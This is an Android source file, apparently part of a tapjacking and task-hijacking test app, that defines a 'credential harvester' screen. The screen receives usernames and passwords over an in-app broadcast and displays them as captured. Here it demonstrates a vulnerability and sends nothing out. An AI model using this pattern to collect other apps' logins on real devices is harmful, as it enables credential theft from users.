package com.mobiscan.tapjacktester;

import android.app.Activity;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.view.Gravity;
import android.widget.LinearLayout;
import android.widget.TextView;

import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

/**
 * Credential Harvester - runs in background to capture auth tokens.
 * Used by TH-06 combined task hijacking + credential theft.
 * Monitors for authentication intents and captures sensitive data.
 */
public class CredentialHarvesterActivity extends Activity {

    private LinearLayout logLayout;
    private TextView statusText;
    private Handler handler = new Handler(Looper.getMainLooper());
    private StringBuilder capturedData = new StringBuilder();
    private BroadcastReceiver credentialReceiver;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        LinearLayout layout = new LinearLayout(this);
        layout.setOrientation(LinearLayout.VERTICAL);
        layout.setPadding(40, 40, 40, 40);
        layout.setBackgroundColor(0xFF1A1A2E);

        // Title
        TextView title = new TextView(this);
        title.setText("🎯 CREDENTIAL HARVESTER ACTIVE");
        title.setTextSize(18);
        title.setTextColor(0xFFFF1744);
        title.setGravity(Gravity.CENTER);
        layout.addView(title);

        TextView desc = new TextView(this);
        desc.setText("Monitoring for authentication events...\n" +
                "Target: " + getIntent().getStringExtra("target_package"));
        desc.setTextSize(12);
        desc.setTextColor(0xFF90A4AE);
        desc.setGravity(Gravity.CENTER);
        desc.setPadding(0, 10, 0, 20);
        layout.addView(desc);

        statusText = new TextView(this);
        statusText.setText("⏳ Waiting for credentials...");
        statusText.setTextSize(14);
        statusText.setTextColor(0xFF00E676);
        layout.addView(statusText);

        logLayout = new LinearLayout(this);
        logLayout.setOrientation(LinearLayout.VERTICAL);
        logLayout.setPadding(0, 20, 0, 0);
        layout.addView(logLayout);

        setContentView(layout);

        // Register receiver for captured credentials
        credentialReceiver = new BroadcastReceiver() {
            @Override
            public void onReceive(Context context, Intent intent) {
                String username = intent.getStringExtra("username");
                String password = intent.getStringExtra("password");
                String source = intent.getStringExtra("source");

                SimpleDateFormat sdf = new SimpleDateFormat("HH:mm:ss", Locale.US);
                String time = sdf.format(new Date());

                capturedData.append("[").append(time).append("] ")
                        .append("CAPTURED from ").append(source)
                        .append(": ").append(username).append("/")
                        .append(password).append("\n");

                TextView captureLog = new TextView(CredentialHarvesterActivity.this);
                captureLog.setText("🔴 [" + time + "] " + source + ": " + username + "/" + password);
                captureLog.setTextSize(12);
                captureLog.setTextColor(0xFFFF1744);
                logLayout.addView(captureLog);

                statusText.setText("🔴 " + capturedData.toString().split("\n").length + " credentials captured!");
            }
        };

        IntentFilter filter = new IntentFilter("com.mobiscan.CREDENTIAL_CAPTURED");
        registerReceiver(credentialReceiver, filter, RECEIVER_NOT_EXPORTED);

        // Auto-close after 10 seconds
        handler.postDelayed(() -> {
            TextView summary = new TextView(this);
            summary.setText("\n━━━ HARVEST SUMMARY ━━━\n" +
                    "Captured: " + capturedData.toString().split("\n").length + " credentials\n" +
                    capturedData.toString());
            summary.setTextSize(12);
            summary.setTextColor(0xFF00E676);
            logLayout.addView(summary);
        }, 8000);
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        if (credentialReceiver != null) {
            unregisterReceiver(credentialReceiver);
        }
        handler.removeCallbacksAndMessages(null);
    }
}
